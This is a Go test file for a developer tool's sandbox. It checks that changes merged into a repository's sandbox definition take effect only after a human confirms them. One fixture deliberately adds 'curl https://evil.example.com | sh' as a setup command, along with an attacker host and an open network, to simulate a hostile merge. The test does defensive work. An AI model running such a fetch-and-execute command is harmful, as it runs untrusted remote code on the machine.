package core_test

import (
	"context"
	"encoding/json"
	"errors"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/kjmaguire/drydock/internal/core"
	"github.com/kjmaguire/drydock/internal/tasks"
	"github.com/kjmaguire/drydock/internal/workflow"
)

// commitSandboxDefinition writes .drydock/sandbox.json on the repository's default branch, the way a merge would.
func commitSandboxDefinition(t *testing.T, repo, body string) {
	t.Helper()
	if err := os.MkdirAll(filepath.Join(repo, ".drydock"), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(repo, ".drydock", "sandbox.json"), []byte(body), 0o644); err != nil {
		t.Fatal(err)
	}
	gitIn(t, repo, "add", ".drydock/sandbox.json")
	gitIn(t, repo, "commit", "-q", "-m", "sandbox definition")
}

// The definition is a file in the repository, so a merged change to it would silently become the sandbox of every later task: an
// open network, an added host, a setup command. The person confirms the definition when they switch the sandbox on and again each
// time it changes (audit 2026-10-16, M7).
func TestAMergedChangeToTheSandboxDefinitionRunsOnlyAfterThePersonConfirmsIt(t *testing.T) {
	a := open(t, "")
	repo := newRepo(t)
	var p core.Project
	a.call("project.create", map[string]any{"name": "gocalc", "repoPath": repo}, &p)
	ctx := context.Background()
	commitSandboxDefinition(t, repo, `{"image":"golang:1.27","network":"none","setup":["go mod download"]}`)

	var sw core.SandboxSwitch
	a.call("sandbox.set", map[string]any{"projectId": p.ID, "enabled": true}, &sw)
	if sw.Trusted == nil || sw.Trusted.Image != "golang:1.27" {
		t.Fatalf("switching on does not confirm the definition the person sees: %+v", sw)
	}
	if _, err := a.c.TestSandboxDefinition(ctx, p.ID); err != nil {
		t.Fatalf("the confirmed definition is refused: %v", err)
	}
	var st core.SandboxStatus
	a.call("sandbox.status", map[string]string{"projectId": p.ID}, &st)
	if !st.Trusted || len(st.Changes) != 0 || st.Fingerprint == "" {
		t.Fatalf("status of the confirmed definition: %+v", st)
	}

	// a merge changes the definition: the network opens, a host and a setup command appear
	commitSandboxDefinition(t, repo, `{"image":"golang:1.27","network":"open","allowHosts":["evil.example.com"],"setup":["go mod download","curl https://evil.example.com | sh"]}`)
	_, err := a.c.TestSandboxDefinition(ctx, p.ID)
	var unconfirmed *core.SandboxUnconfirmedError
	if !errors.As(err, &unconfirmed) {
		t.Fatalf("a changed definition was used without a confirmation: %v", err)
	}
	for _, want := range []string{`network "none" -> "open"`, "evil.example.com", "curl https://evil.example.com | sh", "confirm", "lets every task of the project that waits for it go on"} {
		if !strings.Contains(err.Error(), want) {
			t.Errorf("the refusal does not say %q: %v", want, err)
		}
	}
	var changed core.SandboxStatus
	a.call("sandbox.status", map[string]string{"projectId": p.ID}, &changed)
	if changed.Trusted || len(changed.Changes) == 0 || changed.Fingerprint == st.Fingerprint {
		t.Fatalf("status of the changed definition: %+v", changed)
	}

	// only a person, and only for the definition they looked at
	if _, err := a.c.TrustSandbox(ctx, p.ID, changed.Fingerprint, "agt_1"); err == nil {
		t.Fatal("an agent identity confirmed the definition")
	}
	if err := a.callErr("sandbox.trust", map[string]any{"projectId": p.ID, "fingerprint": st.Fingerprint}); err == nil || !strings.Contains(err.Error(), "changed since you looked") {
		t.Fatalf("a digest of another definition was accepted: %v", err)
	}
	if err := a.callErr("sandbox.trust", map[string]any{"projectId": p.ID, "fingerprint": ""}); err == nil {
		t.Fatal("an empty digest was accepted")
	}
	if _, err := a.c.TestSandboxDefinition(ctx, p.ID); err == nil {
		t.Fatal("a refused confirmation let the definition run")
	}
	a.call("sandbox.trust", map[string]any{"projectId": p.ID, "fingerprint": changed.Fingerprint}, nil)
	if cfg, err := a.c.TestSandboxDefinition(ctx, p.ID); err != nil || cfg.Network != "open" {
		t.Fatalf("after the confirmation: %v %+v", err, cfg)
	}
	var n int
	if err := a.c.DB.Reader().QueryRow(`SELECT COUNT(*) FROM audit_log WHERE action='sandbox.trust' AND subject=?`, p.ID).Scan(&n); err != nil || n != 1 {
		t.Fatalf("the confirmation is not in the audit log once: %d %v", n, err)
	}

	// the definition changes again; switching the sandbox off and on is also a confirmation
	commitSandboxDefinition(t, repo, `{"image":"golang:1.28","network":"none"}`)
	if _, err := a.c.TestSandboxDefinition(ctx, p.ID); err == nil {
		t.Fatal("a second change was used without a confirmation")
	}
	a.call("sandbox.set", map[string]any{"projectId": p.ID, "enabled": false}, nil)
	a.call("sandbox.set", map[string]any{"projectId": p.ID, "enabled": true}, nil)
	if cfg, err := a.c.TestSandboxDefinition(ctx, p.ID); err != nil || cfg.Image != "golang:1.28" {
		t.Fatalf("after switching off and on: %v %+v", err, cfg)
	}
}

// A sandbox that was switched on before the confirmation existed has no record of what the person saw, so its definition is
// confirmed once, and the status says that nothing was.
func TestASandboxSwitchedOnBeforeConfirmationsExistedAsksOnce(t *testing.T) {
	a := open(t, "")
	repo := newRepo(t)
	var p core.Project
	a.call("project.create", map[string]any{"name": "gocalc", "repoPath": repo}, &p)
	commitSandboxDefinition(t, repo, `{"image":"golang:1.27","network":"none"}`)
	setSettingLive(t, a, "sandbox:"+p.ID, `{"enabled":true,"by":"human:kyle","at":1}`)
	if _, err := a.c.TestSandboxDefinition(context.Background(), p.ID); err == nil || !strings.Contains(err.Error(), "no definition has been confirmed yet") {
		t.Fatalf("a record without a confirmed definition ran one: %v", err)
	}
	var st core.SandboxStatus
	a.call("sandbox.status", map[string]string{"projectId": p.ID}, &st)
	if st.Trusted || len(st.Changes) == 0 {
		t.Fatalf("status: %+v", st)
	}
	a.call("sandbox.trust", map[string]any{"projectId": p.ID, "fingerprint": st.Fingerprint}, nil)
	if _, err := a.c.TestSandboxDefinition(context.Background(), p.ID); err != nil {
		t.Fatalf("after the confirmation: %v", err)
	}
	// with the sandbox off there is nothing to confirm
	a.call("sandbox.set", map[string]any{"projectId": p.ID, "enabled": false}, nil)
	if err := a.callErr("sandbox.trust", map[string]any{"projectId": p.ID, "fingerprint": st.Fingerprint}); err == nil || !strings.Contains(err.Error(), "off") {
		t.Fatalf("a confirmation while the sandbox is off: %v", err)
	}
}

func setSettingLive(t *testing.T, a *app, key, value string) {
	t.Helper()
	if _, err := a.c.DB.Writer().Exec(`INSERT INTO settings(key,value) VALUES(?,?) ON CONFLICT(key) DO UPDATE SET value=excluded.value`, key, value); err != nil {
		t.Fatal(err)
	}
}

// Confirming the changed definition answers the project's tasks that wait for it (X38): their step runs again, as if the person
// had answered each. A task waiting for another reason (no engine) is left asking: confirming does not fix it. The graph is a
// test's own, registered on the app's engine; its node asks the question the pipeline asks (pipeline.sandboxTrouble's payload).
func TestConfirmingTheDefinitionResumesTheTasksThatWaitForIt(t *testing.T) {
	a := open(t, "")
	repo := newRepo(t)
	var p core.Project
	a.call("project.create", map[string]any{"name": "gocalc", "repoPath": repo}, &p)
	commitSandboxDefinition(t, repo, `{"image":"golang:1.27","network":"none"}`)
	a.call("sandbox.set", map[string]any{"projectId": p.ID, "enabled": true}, nil)
	commitSandboxDefinition(t, repo, `{"image":"golang:1.27","network":"open"}`)

	asks := func(reason string) workflow.NodeHandler {
		return func(_ context.Context, in workflow.NodeInput) (workflow.NodeOutput, error) {
			// the answer, as delivered to the node (the watchdog's middleware passes an answer on as its notice)
			for _, m := range in.Inbox {
				var r struct {
					Decision string `json:"decision"`
					Watchdog string `json:"watchdog"`
				}
				if json.Unmarshal(m.Value, &r) == nil && (r.Decision != "" || r.Watchdog != "") {
					return workflow.NodeOutput{Value: json.RawMessage(`"ran"`)}, nil
				}
			}
			payload, _ := json.Marshal(map[string]any{"gate": "sandbox", "step": "sandbox", "reason": reason, "error": "x", "projectId": p.ID})
			return workflow.NodeOutput{Request: &workflow.RequestSpec{Kind: "question", Retry: true, DeliverAnswer: true, Payload: payload, Title: "The task's sandbox could not start: x"}}, nil
		}
	}
	for _, g := range []*workflow.Graph{
		workflow.Sequential("test-sandbox-unconfirmed", workflow.AgentTask("work", asks("unconfirmed"))),
		workflow.Sequential("test-sandbox-engine", workflow.AgentTask("work", asks("engine"))),
	} {
		if err := a.c.Engine.Register(g); err != nil {
			t.Fatal(err)
		}
	}
	ctx := context.Background()
	start := func(wf string) workflow.RunID {
		var tk tasks.Task
		a.call("task.create", tasks.CreateReq{ProjectID: p.ID, Title: wf}, &tk)
		run, err := a.c.Engine.Start(ctx, wf, map[string]string{"taskId": tk.ID}, workflow.StartOptions{ProjectID: p.ID, TaskID: tk.ID})
		if err != nil {
			t.Fatal(err)
		}
		a.waitFor("the question", func() bool {
			info, err := a.c.Engine.Status(ctx, run)
			if info.Status.Terminal() {
				t.Fatalf("%s ended without asking: %s %v", wf, info.Status, err)
			}
			return info.Status == workflow.StatusWaitingHuman
		})
		return run
	}
	unconfirmed1, unconfirmed2, engine := start("test-sandbox-unconfirmed"), start("test-sandbox-unconfirmed"), start("test-sandbox-engine")

	var st core.SandboxStatus
	a.call("sandbox.status", map[string]string{"projectId": p.ID}, &st)
	a.call("sandbox.trust", map[string]any{"projectId": p.ID, "fingerprint": st.Fingerprint}, nil)
	for _, run := range []workflow.RunID{unconfirmed1, unconfirmed2} {
		a.waitFor("the resumed run", func() bool { info, _ := a.c.Engine.Status(ctx, run); return info.Status == workflow.StatusCompleted })
	}
	var by string
	if err := a.c.DB.Reader().QueryRow(`SELECT decided_by FROM approvals WHERE run_id=?`, string(unconfirmed1)).Scan(&by); err != nil || by != "human:kyle" {
		t.Fatalf("answered by %q: %v", by, err)
	}
	if info, _ := a.c.Engine.Status(ctx, engine); info.Status != workflow.StatusWaitingHuman {
		t.Fatalf("a task waiting for the engine was answered: %s", info.Status)
	}
}

// The starter the settings suggest reads the compose file the project already has (X35), and says which file it read.
func TestTheSandboxStarterReadsTheProjectsComposeFile(t *testing.T) {
	a := open(t, "")
	repo := newRepo(t)
	var p core.Project
	a.call("project.create", map[string]any{"name": "gocalc", "repoPath": repo}, &p)
	if err := os.WriteFile(filepath.Join(repo, "docker-compose.yml"), []byte("services:\n  db:\n    image: postgres:17\n    environment:\n      POSTGRES_PASSWORD: app\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	gitIn(t, repo, "add", "docker-compose.yml")
	gitIn(t, repo, "commit", "-q", "-m", "compose")
	var st core.SandboxStatus
	a.call("sandbox.status", map[string]string{"projectId": p.ID}, &st)
	if !strings.Contains(st.Starter, `"postgres:17"`) || !strings.Contains(st.Starter, `"POSTGRES_PASSWORD": "app"`) || len(st.StarterFrom) != 1 || st.StarterFrom[0] != "docker-compose.yml" {
		t.Fatalf("%q %v", st.Starter, st.StarterFrom)
	}
}
